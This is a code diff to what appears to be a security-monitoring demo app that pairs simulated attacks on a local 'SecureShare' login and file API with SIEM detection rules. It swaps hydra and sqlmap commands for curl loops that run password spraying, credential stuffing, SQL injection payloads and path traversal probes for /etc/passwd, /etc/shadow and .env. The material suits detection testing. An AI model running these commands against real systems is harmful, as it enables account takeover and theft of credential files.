@@ -13,7 +13,7 @@ TARGET_URL = "http://localhost:5000/api/auth/login"
 TARGET_USER = "admin@secureshare.local"
 WORDLIST = [
     "123456", "password", "welcome1", "admin123", 
-    "letmein", "toor", "pass123", "Admin@123456"
+    "letmein", "toor", "pass123", "Admin123"
 ]
 
 print(f"[*] Initiating Hydra Brute-Force Spray against {TARGET_USER}...")
@@ -24,10 +24,14 @@ for pwd in WORDLIST:
     response = requests.post(TARGET_URL, json=payload, headers=headers)
     print(f"[-] Attempt '{pwd}' -> HTTP {response.status_code}")
     time.sleep(1.0) # > 5 attempts in < 60s triggers BRUTE_FORCE_ATTACK`,
-    bash: `# Automated CLI Hydra Command:
-hydra -l admin@secureshare.local -P /usr/share/wordlists/rockyou.txt \\
-  -s 5000 localhost http-post-form \\
-  "/api/auth/login:{\\"email\\":\\"^USER^\\",\\"password\\":\\"^PASS^\\"}:H=Content-Type: application/json:F=Invalid"`,
+    bash: `# Direct Bash loop simulation:
+for pass in 123456 password welcome1 admin123 letmein toor pass123 Admin123; do
+  curl -s -X POST http://localhost:5000/api/auth/login \\
+    -H 'Content-Type: application/json' \\
+    -d "{\\"email\\":\\"admin@secureshare.local\\",\\"password\\":\\"\${pass}\\"}"
+  echo "[-] Tested password: \${pass}"
+  sleep 1
+done`,
     detectionRule: `Rule: BRUTE_FORCE_ATTACK
 Sliding Window: 60 Seconds
 Trigger Condition: count >= 5 failed logins from single IP
@@ -54,11 +58,13 @@ for payload in SQLI_PAYLOADS:
     
     res = requests.post(TARGET_URL, json=data, headers=headers)
     print(f"[!] Tested SQLi payload: {payload} -> HTTP {res.status_code}")`,
-    bash: `# Automated sqlmap security assessment probe:
-sqlmap -u "http://localhost:5000/api/auth/login" \\
-  --data='{"email":"test","password":"test"}' \\
-  --headers="Content-Type: application/json" \\
-  --batch --risk=3 --level=5`,
+    bash: `# Direct Bash SQL Injection probe:
+for payload in "' OR '1'='1" "admin' --" "admin' /*" "1' UNION SELECT null, username, password FROM users --"; do
+  curl -s -X POST http://localhost:5000/api/auth/login \\
+    -H 'Content-Type: application/json' \\
+    -d "{\\"email\\":\\"\${payload}\\",\\"password\\":\\"dummy\\"}"
+  echo "[-] Injected payload: \${payload}"
+done`,
     detectionRule: `Rule: SQL_INJECTION
 Signature Matching: Regex patterns for UNION SELECT, OR 1=1, boolean bypasses, and inline comments (-- or /*).
 Trigger Condition: Matching SQL token in request payload or query parameter.
@@ -74,7 +80,7 @@ USER_SPRAY_LIST = [
     "root", "admin", "administrator", "ahmed", 
     "anuraj", "shahz", "anfas", "operator"
 ]
-PASSWORD = "CompromisedPassword@2026"
+PASSWORD = "CompromisedPassword2026"
 
 print("[*] Initiating Credential Stuffing & Username Enumeration...")
 for user in USER_SPRAY_LIST:
@@ -87,8 +93,10 @@ for user in USER_SPRAY_LIST:
     bash: `# Multi-user curl spray loop:
 for user in root admin administrator ahmed anuraj shahz anfas; do
   curl -s -X POST http://localhost:5000/api/auth/login \\
-    -H "Content-Type: application/json" \\
-    -d "{\\"email\\":\\"\${user}@secureshare.local\\",\\"password\\":\\"SprayPass123!\\"}"
+    -H 'Content-Type: application/json' \\
+    -d "{\\"email\\":\\"\${user}@secureshare.local\\",\\"password\\":\\"SprayPass123\\"}"
+  echo "[-] Sprayed account: \${user}"
+  sleep 1
 done`,
     detectionRule: `Rule: CREDENTIAL_STUFFING
 Sliding Window: 120 Seconds
@@ -115,8 +123,10 @@ for path in TRAVERSAL_VECTORS:
     res = requests.get(f"{BASE_URL}?path={path}", headers=headers)
     print(f"[!] Path Probe: {path} -> HTTP {res.status_code}")`,
     bash: `# Directory Traversal curl verification:
-curl -v "http://localhost:8001/api/files/download?path=../../../../etc/passwd"
-curl -v "http://localhost:8001/api/files/download?path=..%2f..%2f..%2fetc%2fshadow"`,
+for path in "../../../../etc/passwd" "..%2f..%2f..%2fetc%2fshadow" "../../../../.env"; do
+  curl -s -i "http://localhost:8001/api/files/download?path=\${path}"
+  echo "[-] Probed path: \${path}"
+done`,
     detectionRule: `Rule: PATH_TRAVERSAL
 Pattern Matching: Regex for ../, ..\\, %2e%2e%2f, and sensitive UNIX/Windows paths (/etc/passwd, .env).
 Trigger Condition: Detection of directory escape sequence in URI or parameter.
@@ -150,9 +160,9 @@ threads = [
 for t in threads: t.start()
 for t in threads: t.join()
 print("[+] Multi-vector attack campaign executed successfully.")`,
-    bash: `# Multi-Vector concurrent simulation via API:
+    bash: `# Multi-Vector simulation trigger via SIEM API:
 curl -X POST http://localhost:5001/api/simulate \\
-  -H "Content-Type: application/json" \\
+  -H 'Content-Type: application/json' \\
   -d '{"attack_type": "all"}'`,
     detectionRule: `SIEM Multi-Vector Aggregator:
 Sliding Window: Real-time sliding window analysis across all event streams.
